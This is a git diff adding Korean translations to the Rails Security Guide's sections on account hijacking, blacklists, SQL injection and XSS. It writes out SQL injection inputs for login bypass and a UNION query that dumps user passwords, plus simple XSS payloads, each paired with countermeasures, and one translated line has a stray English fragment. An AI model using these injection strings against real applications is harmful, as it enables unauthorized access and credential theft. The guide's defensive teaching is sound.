@@ -437,11 +437,11 @@ NOTE: _계정에 대한 무차별 공격은 로그인 인증정보에 대한 시
 
 ### [Account Hijacking] 계정 가로채기
 
-많은 수의 웹어플리케이션에서 쉽게 유저 계정을 가로채기 할 수 있습니다. 왜 계정을 다르게, 좀 더 어렵게 만들지 못할까? [[[Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.]]]
+많은 수의 웹어플리케이션에서 유저 계정을 쉽게 가로채기 할 수 있습니다. 왜 계정을 다르게, 좀 더 어렵게 만들지 못할까? [[[Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.]]]
 
 #### [Passwords] 비밀번호
 
-공격자가 특정 사용자의 세션 쿠키를 가로태서 웹어플리케이션을 공동으로 사용하는 상황을 가정해 보겠습니다. 비밀번호를 쉽게 변경할 수 있을 경우 공격자는 클릭만 몇차례 하는 것만으로 계정을 가로채게 될 것입니다. 또는 비밀번호 변경 폼이 CSRF에 취약할 경우, 공격자는 CSRF 공격을 할 수 있도록 작업해 놓은 IMG 태그가 삽입되어 있는 웹페이지로 사용자를 유도하여 사용자의 비밀번호를 변경하도록 할 수 있을 것입니다. 이에 대한 대처방법으로는, 물론, _비밀번호 변경 폼을 CSRF에 대해서 안전하게 만들어야 합니다_. 그리고 비밀번호 변경시에 이전의 비밀번호도 함께 입력하도록 해야 합니다. [[[Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.]]]
+공격자가 특정 사용자의 세션 쿠키를 가로채서 웹어플리케이션을 공동으로 사용하는 상황을 가정해 보겠습니다. 비밀번호를 쉽게 변경할 수 있을 경우 공격자는 클릭만 몇차례 하는 것만으로 계정을 가로채게 될 것입니다. 또는 비밀번호 변경 폼이 CSRF에 취약할 경우, 공격자는 CSRF 공격을 할 수 있도록 작업해 놓은 IMG 태그가 삽입되어 있는 웹페이지로 사용자를 유도하여 사용자의 비밀번호를 변경하도록 할 수 있을 것입니다. 이에 대한 대처방법으로는, 물론, _비밀번호 변경 폼을 CSRF에 대해서 안전하게 만들어야 합니다_. 그리고 비밀번호 변경시에 이전의 비밀번호도 함께 입력하도록 해야 합니다. [[[Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.]]]
 
 #### [E-Mail] 이메일
 
@@ -449,7 +449,7 @@ NOTE: _계정에 대한 무차별 공격은 로그인 인증정보에 대한 시
 
 #### [Other] 기타
 
-웹어플리케이션에 따라서, 유저의 계정을 가로채는 방법에는 여러가지가 있을 수 있습니다. 많은 경우에, CSRF와 XSS를 이용하면 이와 같은 작업을 하는데 도움을 받을 수 있습니다. [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/)에서 CSRF 취약성을 예로 들 수 있습니다. 이와 같이 새로운 개념을 검증하기 위한 공격상황에서, 공격에 희생이 될 사용자는 공격자가 조정하는 웹사이트로 유인되었을 것입니다. 그리고 해당 사이트의 웹페이지에는, 결국은 사용자의 구글메일의 필터 설정을 변경하는 HTTP GET 요청을 하도록 작업을 해 놓은 IMG 태그를 삽입해 놓게 됩니다. 이렇게해서 공격을 받게된 사용자가 구글 메일로 로그인하면 공격자는 필터를 변경해서 모든 이메일을 공격자의 이메일 주소로 전달되도록 할 것입니다. 이것은 거의 이메일 계정 전체를 가로채는 것 만큼의 피해를 주게 됩니다. 이에 대한 조치는, _어플리케이션 로직을 재검토해서 XSS와 CSRF에 취약한 부분을 모두 제거하는 것입니다._ [[[Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.]]]
+웹어플리케이션에 따라서, 유저의 계정을 가로채는 방법에는 여러가지가 있을 수 있습니다. 많은 경우에, CSRF와 XSS를 이용하면 이와 같은 작업을 하는데 도움을 받을 수 있습니다. [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/)에서 CSRF 취약성을 예로 들 수 있습니다. 이와 같이 새로운 개념을 검증하기 위한 공격상황에서, 공격에 희생이 될 사용자는 공격자가 조정하는 웹사이트로 유인되었을 것입니다. 그리고 해당 사이트의 웹페이지에는, 결국은 사용자의 구글메일의 필터 설정을 변경하는 HTTP GET 요청을 하도록 작업을 해 놓은 IMG 태그를 삽입해 놓게 됩니다. 이렇게해서 공격을 받게된 사용자가 구글 메일로 로그인하면 공격자는 필터를 변경해서 모든 이메일을 공격자의 이메일 주소로 전달되도록 할 것입니다. 이것은 거의 이메일 계정 전체를 가로채는 것 만큼의 큰 피해를 주게 됩니다. 이에 대한 조치는, _어플리케이션 로직을 재검토해서 XSS와 CSRF에 취약한 부분을 모두 제거하는 것입니다._ [[[Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.]]]
 
 ### [CAPTCHAs] 캡챠
 
@@ -565,160 +565,162 @@ WARNING: _하나의 파라미터를 변경하는 것으로 사용자는 접근�
 
 코드의 난독성과 자바스크립트를 이용한 보안처리를 함으로써 안전하다고 생각하는 우를 범해서는 안됩니다. 모질라 파이어폭스용 웹개발자용 툴바를 이용하면 폼 안의 숨겨진 모든 필드를 재검토하고 변경할 수 있게 해 줍니다. _자바스크립트를 이용하여 사용자 입력 데이터에 대한 유효성 검증을 할 수 있지만 공격자는 예상치 못한 값을 이용하여 악성 요청을 여전히 보낼 수 있게 됩니다._ 모질라 파이어폭스용 Live Http Headers 플러그인은 모든 요청에 대한 로그를 잡아내어 요청을 반복하고 변경할 수 있게 해 줍니다. 이것은 자바스크립트 유효성 검증을 우회하는 손쉬운 방법이 됩니다. 그리고 심지어 클라이언트 측 프록시를 이용하면 인터넷을 통한 어떠한 요청이나 반응을 가로챌 수 있게 됩니다. [[[Don't be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. _JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.]]]
 
-Injection
+[Injection] 주입
 ---------
 
-INFO: _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._
+INFO: _주입이란 악성코드나 파라미터를 웹어플리케이션으로 삽입해서 보안이 유지된 상태에서도 해당 코드를 실행토록하는 공격형태입니다. 주입의 두드러진 예로는 XSS와 SQL 주입이 있습니다._ [[[_Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._]]]
 
-Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.
+주입은 다루기가 매우 힘든데, 동일한 코드나 파라미터가 어떤 경우에는 악성코드로써 작동하지만 또 다른 상황에서는 전혀 해를 끼치지 않을 수 있기 때문입니다. 그러한 상황으로는 스크립팅, 쿼리 또는 프로그래밍 언어, 쉘이나 루비/레일스 메소드를 들 수 있습니다. 여기서는 주입공격이 발생할 수 있는 모든 주요 상황을 다로도록 하겠습니다. 그러나 첫번째 섹션에서는 주입과 연관해서 소프트웨어 설계상의 결정사항들에 대해서 다룰 것입니다. [[[Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.]]]
 
-### Whitelists versus Blacklists
+### [Whitelists versus Blacklists] 화이트리스트 대 블랙리스트
 
-NOTE: _When sanitizing, protecting or verifying something, whitelists over blacklists._
+NOTE: _중요한 내용을 보호할 때는 블랙리스트 보다는 화이트리스트가 더 낫습니다._ [[[_When sanitizing, protecting or verifying something, whitelists over blacklists._]]]
 
-A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _prefer to use whitelist approaches_:
+블랙리스트란 불량 이메일 주소, 비공개 액션 또는 불량 HTML 태그들의 목록이 될 수 있습니다. 이것은 선호되는 이메일 주소, 공개 액션, 선호되는 HTML 태그 등과 같은 목록을 나타내는 화이트리스트의 상반되는 개념입니다. 스탬 필터와 같이 때로는 화이트리스트를 만들 수 없는 상황에서도 가능한한 아래와 같은 화이트리스트 접근법을 이용해도록 해야 합니다. [[[A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _prefer to use whitelist approaches_:]]]
 
-* Use before_action only: [...] instead of except: [...]. This way you don't forget to turn it off for newly added actions.
-* Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
-* Don't try to correct user input by blacklists:
-    * This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
-    * But reject malformed input
+* except: [...] 대신에 only: [...] 옵션을 이용해서 before_action을 사용해야 합니다. 이렇게 해야 새로 추가한 액션에 대해서 별도의 추가작업을 잊지 않게 될 것입니다. [[[Use before_action only: [...] instead of except: [...]. This way you don't forget to turn it off for newly added actions.]]]
 
-Whitelists are also a good approach against the human factor of forgetting something in the blacklist.
+* XSS 를 방지하기 위해서 &lt;script&gt; 를 제거하는 대신에 &lt;strong&gt; 를 사용해야 합니다. 자세한 것은 아래를 보기 바랍니다. [[[Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.]]]
 
-### SQL Injection
+* 블랙리스트가 작성한 입력내용을 수정하려고 시도해서는 안됩니다. [[[Don't try to correct user input by blacklists:]]]
+    * 이와 같은 조치로 인하여 공격이 작동하게 될 것입니다. "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "") [[[This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")]]]
+    * 그러나 잘 못된 입력내용은 거절해야 합니다. [[[But reject malformed input]]]
 
-INFO: _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._
+화이트리스트는, 블랙리스트 상에 중요한 항목을 빠뜨릴 수 있는 사람의 실수를 방지하기 위한 좋은 접근방법이 되기도 합니다. [[[Whitelists are also a good approach against the human factor of forgetting something in the blacklist.]]]
 
-#### Introduction
+### [SQL Injection] SQL 주입
 
-SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:
+INFO: _영리한 메소드 덕분에, 이것은 대부분의 레일스 어플리케이션에서 거의 문제가 되지 않습니다. 그러나, 이것은 웹어플리케이션에서 매우 치명적이고 일반적인 공격방법이기 때문에 자세히 알아둘 필요가 있습니다._ [[[_Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._]]]
+
+#### [Introduction] 개요
+
+SQL 주입은 웹어플리케이션 파라미터를 조작하여 데이터베이스 쿼리에 영향을 미치도록 하는 것을 공격목표로 합니다. SQL 주입의 일반적인 공격목표는 권한체크를 우회하는 것입니다. 다른 목표는 데이터를 조작하거나 임의의 데이터를 읽어 들이는 것입니다. 아래에는 쿼리상에 사용자 입력 데이터를 사용하지 않는 방법에 대한 예를 보여 줍니다. [[[SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:]]]
 
 ```ruby
 Project.where("name = '#{params[:name]}'")
 ```
 
-This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:
+이것은 검색 액션에서 필요한 수 있는데 사용자는 찾기를 원하는 특정 프로젝트의 이름을 입려하게 됩니다. 악성 사용자가 ' OR 1 --' 와 같이 입력한다면 SQL결과는 다음과 같을 것입니다. [[[This could be in a search action and the user may enter a project's name that he wants to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:]]]
 
 ```sql
 SELECT * FROM projects WHERE name = '' OR 1 --'
 ```
 
-The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.
+두개의 대쉬(--)는 이후의 모든 내용을 무시하는 코멘트의 시작을 표시하는 것입니다. 따라서 이 쿼리는 사용자들이 볼 수 없는 프로젝트 테이블의 모든 레코드를 반환하게 됩니다. 조건이 모든 레코드에 대해서 true 상태이기 때문입니다. [[[The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.]]]
 
-#### Bypassing Authorization
+#### [Bypassing Authorization] 권한 우회하기
 
-Usually a web application includes access control. The user enters his login credentials, the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.
+대개 웹어플리케이션은 접근 제한을 포함합니다. 사용자는 자신의 로그인 정보를 입력하고 웹어플리케이션은 사용자 테이블에서 일치하는 레코드를 검색하게 됩니다. 어플리케이션은 해당 레코드를 찾게될 경우 접근을 승인하게 됩니다. 그러나, 공격자는 SQL 주입을 이용하여 이러한 인증을 우회할 수 있습니다. 아래에는, 사용자가 입력한 로그인 정보와 일치하는 첫번째 레코드를 사용자 테이블에서 찾기위해 레일스에서 수행하는 전형적인 데이터베이스 쿼리를 보여 줍니다. [[[Usually a web application includes access control. The user enters his login credentials, the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.]]]
 
 ```ruby
 User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
 ```
 
-If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:
+공격자가 name으로 ' OR '1'='1 을 password로 ' OR '2'>'1 을 입력할 때 SQL 쿼리 결과는 다음과 같을 것입니다. [[[If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:]]]
 
 ```sql
 SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
 ```
 
-This will simply find the first record in the database, and grants access to this user.
+이것은 데이터베이스에서 첫번째 레코드를 찾아서 해당 사용자에게 접근 승인을 하게 됩니다. [[[This will simply find the first record in the database, and grants access to this user.]]]
 
-#### Unauthorized Reading
+#### [Unauthorized Reading] 권한없이 읽기
 
-The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:
+UNION 문장은 두개의 SQL 쿼리를 연결해서 하나의 결과셋으로 데이터를 반환합니다. 공격자는 이거을 이용해서 데이터베이스로부터 임의의 데이터를 읽을 수 있습니다. 위에서 언급했던 예제 코드를 보겠습니다. [[[The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:]]]
 
 ```ruby
 Project.where("name = '#{params[:name]}'")
 ```
 
-And now let's inject another query using the UNION statement:
+그리고 UNION 문장을 이용해서 또 다른 쿼리를 주입해 봅시다. [[[And now let's inject another query using the UNION statement:]]]
 
 ```
 ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
 ```
 
-This will result in the following SQL query:
+이것은 다음과 같은 SQL 쿼리 결과를 만들어 줄 것입니다. [[[This will result in the following SQL query:]]]
 
 ```sql
 SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --'
 ```
 
-The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.
+쿼리 결과는 이름이 비어있는 프로젝트가 없기 때문에 반환되는 프로젝트 목록이 없고 대신에 사용자 이름과 비밀번호 목록이 될 것입니다. 따라서 이런 경우를 대비해서, 데이터베이스에서 저장할 때는 비밀번호를 암호화해야 합니다. 공격자에 입장에서 유일한 문제점은 컬럼의 수가 양쪽 쿼리에서 동일해야 한다는 것입니다. 이러한 이유로 두번째 쿼리문에 숫자 1 을 여러개 포함하게 되는데, 첫번째 쿼리의 컬럼 수와 일치시키 위해서 항상 1이라는 값을 가지게 될 것입니다. [[[The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.]]]
 
-Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).
+또한, 두번째 쿼리는 AS 문을 사용해서 컬럼명을 변경하게 되는 이로써 웹어플리케이션은 사용자 테이블로부터 값들을 표시하게 됩니다. 적어도 레일스 [2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/)로 업데이트 해야 합니다. [[[Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).]]]
 
-#### Countermeasures
+#### [Countermeasures] 대처방안
 
-Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <em class="highlight">Using `Model.find(id)` or `Model.find_by_some thing(something)` automatically applies this countermeasure</em>. But in SQL fragments, especially <em class="highlight">in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually</em>.
+루비온레일스는 ' , " , NULL 문자, 개행문자와 같은 특수한 SQL 문자를 이스케이프하는 내장 필터를 가지고 있습니다. 따라서 cters, which will escape ' , " , NULL character and line breaks. <em class="highlight">`Model.find(id)` 또는 `Model.find_by_some thing(something)` 를 사용하면 이러한 조치들이 자동으로 적용됩니다</em>. 그러나 <em class="highlight">조건절(`where("...")`), `connection.execute()` 또는 `Model.find_by_sql()` 메소드와 같은 경우에는 SQL 부분에서 대해서 직접 수작업으로 적용시켜줘야 합니다</em>. [[[Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. <em class="highlight">Using `Model.find(id)` or `Model.find_by_some thing(something)` automatically applies this countermeasure</em>. But in SQL fragments, especially <em class="highlight">in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually</em>.]]]
 
-Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:
+조건절 옵션에 문자열을 넘겨주는 대신에, 아래와 같이 문제의 소지가 있는 문자열을 방지하기 위해서 배열을 넘겨 줄 수 있습니다. [[[Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:]]]
 
 ```ruby
 Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
 ```
 
-As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:
+보다시피, 배열의 첫번째 부분은 의문부호를 가진 SQL 문입니다. 배열의 두번째 부분에 있는 변수들은 의문부호를 대체하게 됩니다. 또는 동일한 결과에 대해서 해시를 넘겨 줄 수 있습니다. [[[As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:]]]
 
 ```ruby
 Model.where(login: entered_user_name, password: entered_password).first
 ```
 
-The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.
+배열이나 해시 형태는 모델의 경우에만 사용 가능합니다. 그외에는 `sanitize_sql()` 메소드를 사용할 수 있습니다. _SQL 문에 외부 문자열을 사용할 경우에는 보안상의 문제가 없는지를 생각하는 습관을 들이도록 해야 합니다_. [[[The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.]]]
 
-### Cross-Site Scripting (XSS)
+### [Cross-Site Scripting (XSS)] 사이트간 스크립팅(XSS)
 
-INFO: _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._
+INFO: _웹어플리케이션에서 가장 광범위하게 퍼져 있고 가장 치명적인 보안 취약성 중의 하나는 XSS입니다. 이러한 악성 공격은 클라이언트측 실행 코드를 주입하게 됩니다. 레일스는 이러한 공격을 방어하는 헬퍼메소드를 제공해 줍니다._ [[[_The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._]]]
 
-#### Entry Points
+#### [Entry Points] 진입점
 
-An entry point is a vulnerable URL and its parameters where an attacker can start an attack.
+하나의 진입점은 공격자가 공격을 시작할 수 있는 URL과 파라미터입니다. [[[An entry point is a vulnerable URL and its parameters where an attacker can start an attack.]]]
 
-The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.
+가장 일반적인 진입점은 메시지 포스트, 사용자 댓글, 방명록이지만, 프로젝트 타이들, 문서명, 검색결과 페이지 역시 공격에 취약합니다. 사용자가 데이터를 입력할 수 있는 모든 곳이 공격 대상이 될 수 있습니다. 그러나 데이터 입력은 반드시 웹사이트의 입력창에서만 가능한 것이 아니라, 명시적이거나 숨겨졌거나 또는 내부에서 사용하는 어떠한 URL 파라미터를 통해서도 가능하다는 것입니다. 사용자는 어떠한 트래픽도 중간에서 가로챌 수 있다는 것을 기억해야 합니다. [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/)와 같은 어플리케이션이나 클라이언트측 프록시를 이용하면 쉽게 요청을 변경할 수 있습니다. [[[The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.]]]
 
-XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.
+XSS 공격은 다음과 같이 동작합니다. 공격자는 악성코드를 주입하고 웹어플리케이션은 그것을 저장한 후 웹 페이지상에 보여주게 됩니다. 결국 희생자에게 보여지게 되는 것입니다. 대부분의 XSS 사례는 단순히 경고창을 보여주지만 실제로는 매우 강력한 문제를 야기시키게 됩니다. XSS는 쿠키를 훔치고, 세션을 가로채고, 희생자를 가짜 웹사이트로 리디렉트시켜 공격자의 이득을 위해 만들어 놓은 광고에 노출되도록 합니다. 또한 웹사이트상의 엘리먼트를 변경해서 개인 정보를 빼내거나 웹브라우저의 보안구멍을 토해서 악성소프트웨어를 설치하기도 합니다. [[[XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.]]]
 
-During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.
+2007년 후반기 동안, 모질라 브라우저에서는 88개, 사파리 22개, IE 18개, 오페라 12개의 취약성이 발견되었습니다. [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)에서는 2007년 후반기에 239개의 브라우저 플러그인 취약성을 보고한 바도 있습니다. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/)은 이러한 취약성을 악용하는 매우 활발한 최신의 공격 프레임워크입니다. 범죄를 저지르는 해커들에게는, 웹어플리케이션 프레임워크 상의 SQL 주입 취약성을 악용해서 모든 텍스트 테이블 컬럼에 악성 코드를 삽입할 수 있다는 것은 매우 매력적인 것입니다. 2008년 4월, 51만개의 사이트가 이와 같은 공격을 당했는데, 이중에는 영국 정부, 유엔, 그 외 많은 주요 기관들이 포함되어 있습니다. [[[During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.]]]
 
-A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).
+진입점의 비교적 새롭지만 드문 형태는 배너 광고입니다. 2008년초, [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/)에 의하면, 악성코드가 MySapce와 Excite와 같은 유명 사이트에 있는 배너 광고에 나타났습니다. [[[A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).]]]
 
-#### HTML/JavaScript Injection
+#### [HTML/JavaScript Injection] HTML/자바스크립트 주입
 
-The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.
+가장 일반적인 XSS 언어는 당연히 가장 보편화되어 있는 클라이언트측 스크립팅 언어인 자바스크립트인데, 종종 HTML과 함께 코딩되기도 합니다. _사용자 입력을 이스케이핑하는 것은 필수적인 것입니다_. [[[The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.]]]
 
-Here is the most straightforward test to check for XSS:
+XSS를 체크할 수 가장 손쉬운 테스트가 아래 소개되어 있습니다. [[[Here is the most straightforward test to check for XSS:]]]
 
 ```html
 <script>alert('Hello');</script>
 ```
 
-This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:
+이 자바스크립트 코드는 단순히 경고창을 보여줄 것입니다. 다음 예제코드는 매우 드문 위치에서 정확히 동일한 동작을 수행하게 됩니다. [[[This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:]]]
 
 ```html
 <img src=javascript:alert('Hello')>
 <table background="javascript:alert('Hello')">
 ```
 
-##### Cookie Theft
+##### [Cookie Theft] 쿠기 도둑
 
-These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:
